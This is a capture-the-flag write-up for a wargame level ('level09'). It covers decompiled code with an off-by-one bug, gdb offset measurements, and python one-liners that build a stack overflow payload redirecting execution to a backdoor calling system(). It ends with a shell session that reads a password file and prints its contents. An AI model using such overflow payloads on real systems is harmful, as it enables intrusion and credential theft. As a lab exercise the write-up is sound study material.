## Step 1: Static & Dynamic Analysis

```c
0000088c    int64_t secret_backdoor()
0000088c    {
0000088c        void var_88;
000008ad        fgets(&var_88, 0x80, *(uint64_t*)stdin);
000008bf        return system(&var_88);
0000088c    }

000008c0    int64_t handle_msg()
000008c0    {
000008c0        int64_t s;
000008d8        __builtin_memset(&s, 0, 40);
000008ff        int32_t var_14 = 140;
00000910        void buffer;
00000910        set_username(&buffer);
0000091f        set_msg(&buffer);
00000931        return puts(">: Msg sent!");
000008c0    }

00000932    char* set_msg(char* buffer)
00000932    {
00000932        void message_input;
0000095e        __builtin_memset(&message_input, 0, 1024);
00000968        puts(">: Msg @Unix-Dude");
0000097c        printf(">>: ");
0000099d        fgets(&message_input, 1024, *(uint64_t*)stdin);
000009cc        return strncpy(buffer, &message_input, (int64_t)*(uint32_t*)(buffer + 180));
00000932    }

000009cd    int64_t set_username(int64_t buffer)
000009cd    {
000009cd        void username_input;
000009f9        __builtin_memset(&username_input, 0, 128);
00000a03        puts(">: Enter your username");
00000a17        printf(">>: ");
00000a38        fgets(&username_input, 128, *(uint64_t*)stdin);
00000a38        
00000a6e        for (int32_t i = 0; i <= 40; i += 1)
00000a6e        {
00000a6e            if (!*(uint8_t*)(&username_input + (int64_t)i))
00000a7f                break;
00000a7f            
00000a5f            *(uint8_t*)(buffer + (int64_t)i + 140) = *(uint8_t*)(&username_input + (int64_t)i);
00000a6e        }
00000a6e        
00000aa7        return printf(">: Welcome, %s", buffer + 140);
000009cd    }

00000aa8    int32_t main(int32_t argc, char** argv, char** envp)
00000aa8    {
00000aa8        puts("--------------------------------…");
00000ab8        handle_msg();
00000ac3        return 0;
00000aa8    }
```
### Explanation

This binary takes two inputs using `fgets()`, a username and a message. The `handle_msg()` function manages these inputs with a `180 bytes` buffer on the stack. It calls `set_username()` and `set_msg()` in sequence, both modifying this buffer.

In `set_username()`, a `128 bytes` buffer is created, and the first `41 bytes` are copied into the main buffer at offset `140`.

```c
for (int32_t i = 0; i <= 40; i += 1)
```

In `set_msg()`, a `1024 bytes` buffer is created for the message. The function then copies a number of bytes determined by the value stored at `buffer + 180`, which is initially set to `140`.

The vulnerability is in `set_username()`. Since `41` bytes are copied, it allows overwriting the value at `buffer + 180`, originally `140`. By modifying this value, the size limit for copying in `set_msg()` can be increased, leading to a `buffer overflow`.

```c
strncpy(buffer, &message_input, (int64_t)*(uint32_t*)(buffer + 180))
```

To exploit this, we need to determine the buffer’s base address and the saved return address.

```
0x7fffffffea10: 0xffffeae0      0x00007fff      0x55554924      0x00005555
0x7fffffffea20: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffea30: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffea40: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffea50: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffea60: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffea70: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffea80: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffea90: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffeaa0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffeab0: 0x41414141      0x41414141      0x41414141      0x41414141 
```

Setting a breakpoint after filling the buffer and examining memory reveals that the controlled buffer starts at `0x7fffffffea20`.

```
(gdb) i f
Stack level 0, frame at 0x7fffffffeaf0:
 rip = 0x555555554930 in handle_msg; saved rip 0x555555554abd
 called by frame at 0x7fffffffeb00
 Arglist at 0x7fffffffeae0, args: 
 Locals at 0x7fffffffeae0, Previous frame's sp is 0x7fffffffeaf0
 Saved registers:
  rbp at 0x7fffffffeae0, rip at 0x7fffffffeae8
(gdb) x/2wx 0x7fffffffeae8
0x7fffffffeae8: 0x55554abd      0x00005555
```

We can see that the return address is stored at `0x7fffffffeae8`.

```python
>>> 0x7fffffffeae8 - 0x7fffffffea20
200
```

The difference between these addresses shows that the return address is `200 bytes` from the buffer’s base address.

```bash
python -c 'print(("A" * 40) + "\xd0")' > /tmp/exploit
```

This input fills the first `40 bytes` and overwrites the stored message length with `208`.

```python
python -c 'print(("A" * 200) + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1])' >> /tmp/exploit
```

For the second input, we overflow into the saved return address and redirect execution to `secret_backdoor()`.

## Step 2: Exploiting the Binary

```bash
level09@OverRide:~$ cat /tmp/exploit - | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
>>: >: Msg sent!
% cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
